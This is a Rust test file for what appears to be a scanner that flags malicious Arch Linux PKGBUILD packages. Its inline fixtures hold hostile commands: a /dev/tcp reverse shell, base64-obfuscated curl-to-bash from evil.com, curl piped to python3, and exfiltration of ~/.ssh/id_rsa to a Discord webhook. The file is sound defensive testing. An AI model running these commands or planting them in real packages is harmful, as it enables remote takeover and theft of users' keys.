use traur::coordinator::scan_pkgbuild;
use traur::shared::scoring::Tier;

fn signal_ids(result: &traur::shared::scoring::ScanResult) -> Vec<&str> {
    result.signals.iter().map(|s| s.id.as_str()).collect()
}

#[test]
fn test_curl_pipe_bash_detected_as_malicious() {
    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
    let result = scan_pkgbuild("firefox-fix-bin", pkgbuild);

    assert_eq!(result.tier, Tier::Malicious, "curl|bash should trigger MALICIOUS tier");
    assert!(
        result.override_gate_fired.is_some(),
        "Override gate should fire for curl|bash"
    );

    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
    assert!(
        signal_ids.contains(&"P-CURL-PIPE"),
        "Should detect P-CURL-PIPE signal"
    );
}

#[test]
fn test_malicious_pkgbuild_detects_multiple_signals() {
    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
    let result = scan_pkgbuild("firefox-fix-bin", pkgbuild);

    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();

    // Should detect URL shortener
    assert!(
        signal_ids.contains(&"P-URL-SHORTENER"),
        "Should detect bit.ly URL shortener, got: {signal_ids:?}"
    );

    // Should detect raw IP
    assert!(
        signal_ids.contains(&"P-RAW-IP-URL"),
        "Should detect raw IP URL, got: {signal_ids:?}"
    );

    // Should detect name impersonation (firefox-fix-bin)
    assert!(
        signal_ids.contains(&"B-NAME-IMPERSONATE"),
        "Should detect name impersonation, got: {signal_ids:?}"
    );
}

#[test]
fn test_benign_pkgbuild_scores_low() {
    let pkgbuild = include_str!("fixtures/benign/yay.PKGBUILD");
    let result = scan_pkgbuild("yay", pkgbuild);

    assert!(
        result.tier <= Tier::Medium,
        "Benign PKGBUILD should score LOW or MEDIUM, got {:?} (score: {})",
        result.tier,
        result.score
    );
    assert!(
        result.override_gate_fired.is_none(),
        "No override gate should fire for benign package"
    );
}

#[test]
fn test_reverse_shell_detected() {
    let pkgbuild = r#"
pkgname=evil-tool
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/tool.tar.gz')
sha256sums=('abc123')

package() {
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
}
"#;
    let result = scan_pkgbuild("evil-tool", pkgbuild);

    assert_eq!(result.tier, Tier::Malicious);
    assert!(result.override_gate_fired.is_some());

    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
    assert!(signal_ids.contains(&"P-REVSHELL-DEVTCP"));
}

#[test]
fn test_base64_obfuscation_detected() {
    let pkgbuild = r#"
pkgname=sneaky
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/src.tar.gz')
sha256sums=('abc123')

package() {
    payload=$(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d)
    eval "$payload"
}
"#;
    let result = scan_pkgbuild("sneaky", pkgbuild);

    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
    assert!(
        signal_ids.contains(&"P-BASE64"),
        "Should detect base64 decoding, got: {signal_ids:?}"
    );
    assert!(
        signal_ids.contains(&"P-EVAL-VAR"),
        "Should detect eval $var, got: {signal_ids:?}"
    );
}

#[test]
fn test_checksum_skip_on_non_vcs() {
    let pkgbuild = r#"
pkgname=sketchy-bin
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/sketchy.tar.gz')
sha256sums=('SKIP')
"#;
    let result = scan_pkgbuild("sketchy-bin", pkgbuild);

    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
    assert!(
        signal_ids.contains(&"P-SKIP-ALL"),
        "Should detect SKIP checksums on non-VCS package, got: {signal_ids:?}"
    );
}

#[test]
fn test_checksum_skip_on_vcs_not_flagged() {
    let pkgbuild = r#"
pkgname=cool-tool-git
pkgver=1.0.r42.abc1234
pkgrel=1
arch=('x86_64')
source=('git+https://github.com/user/cool-tool.git')
sha256sums=('SKIP')
"#;
    let result = scan_pkgbuild("cool-tool-git", pkgbuild);

    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
    assert!(
        !signal_ids.contains(&"P-SKIP-ALL"),
        "VCS packages should not be flagged for SKIP checksums"
    );
    assert!(
        !signal_ids.contains(&"P-NO-CHECKSUMS"),
        "VCS packages should not be flagged for missing checksums"
    );
}

#[test]
fn test_discord_webhook_detected() {
    let pkgbuild = r#"
pkgname=data-stealer
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/tool.tar.gz')
sha256sums=('abc123')

package() {
    curl -X POST https://discord.com/api/webhooks/123456/ABCDEF -d "{\"content\":\"$(cat ~/.ssh/id_rsa)\"}"
}
"#;
    let result = scan_pkgbuild("data-stealer", pkgbuild);

    let ids = signal_ids(&result);
    assert!(ids.contains(&"P-DISCORD-WEBHOOK"));
    assert!(ids.contains(&"P-SSH-ACCESS"));
}

#[test]
fn test_curl_pipe_python_detected() {
    let pkgbuild = r#"
pkgname=sneaky-py
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/tool.tar.gz')
sha256sums=('abc123')

package() {
    curl -s https://evil.com/setup.py | python3
}
"#;
    let result = scan_pkgbuild("sneaky-py", pkgbuild);

    assert_eq!(result.tier, Tier::Malicious);
    assert!(signal_ids(&result).contains(&"P-CURL-PIPE-PYTHON"));
}

#[test]
fn test_suid_bit_detected() {
    let pkgbuild = r#"
pkgname=escalator
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/tool.tar.gz')
sha256sums=('abc123')

package() {
    install -Dm755 tool "$pkgdir/usr/bin/tool"
    chmod +s "$pkgdir/usr/bin/tool"
}
"#;
    let result = scan_pkgbuild("escalator", pkgbuild);

    assert!(
        signal_ids(&result).contains(&"P-SUID-BIT"),
        "Should detect chmod +s, got: {:?}",
        signal_ids(&result)
    );
}

#[test]
fn test_source_url_ignores_comments() {
    let pkgbuild = r#"
pkgname=safe-tool
pkgver=1.0
pkgrel=1
arch=('x86_64')
# see https://pastebin.com/example for details
source=('https://github.com/user/safe-tool/archive/v1.0.tar.gz')
sha256sums=('abc123')

package() {
    install -Dm755 safe-tool "$pkgdir/usr/bin/safe-tool"
}
"#;
    let result = scan_pkgbuild("safe-tool", pkgbuild);

    assert!(
        !signal_ids(&result).contains(&"P-PASTEBIN"),
        "Pastebin URL in comment should NOT trigger P-PASTEBIN"
    );
}

#[test]
fn test_source_url_detects_in_source_array() {
    let pkgbuild = r#"
pkgname=shady
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://pastebin.com/raw/abc123')
sha256sums=('abc123')

package() {
    install -Dm755 script "$pkgdir/usr/bin/shady"
}
"#;
    let result = scan_pkgbuild("shady", pkgbuild);

    assert!(
        signal_ids(&result).contains(&"P-PASTEBIN"),
        "Pastebin URL in source=() SHOULD trigger P-PASTEBIN, got: {:?}",
        signal_ids(&result)
    );
}

#[test]
fn test_checksum_mixed_skip_not_flagged() {
    let pkgbuild = r#"
pkgname=mixed-pkg
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/a.tar.gz'
        'git+https://github.com/user/repo.git')
sha256sums=('abc123'
            'SKIP')
"#;
    let result = scan_pkgbuild("mixed-pkg", pkgbuild);

    assert!(
        !signal_ids(&result).contains(&"P-SKIP-ALL"),
        "Mixed SKIP/real checksums should NOT trigger P-SKIP-ALL"
    );
}

#[test]
fn test_sha1_weak_checksum_flagged() {
    let pkgbuild = r#"
pkgname=old-style
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.com/a.tar.gz')
sha1sums=('da39a3ee5e6b4b0d3255bfef95601890afd80709')
"#;
    let result = scan_pkgbuild("old-style", pkgbuild);

    assert!(
        signal_ids(&result).contains(&"P-WEAK-CHECKSUMS"),
        "sha1sums should trigger P-WEAK-CHECKSUMS, got: {:?}",
        signal_ids(&result)
    );
}

#[test]
fn test_name_impersonation_new_suffixes() {
    let result = scan_pkgbuild("firefox-cracked-bin", "pkgname=firefox-cracked-bin\npkgver=1.0\npkgrel=1\narch=('x86_64')\nsource=()\n");

    assert!(
        signal_ids(&result).contains(&"B-NAME-IMPERSONATE"),
        "firefox-cracked-bin should trigger B-NAME-IMPERSONATE, got: {:?}",
        signal_ids(&result)
    );
}
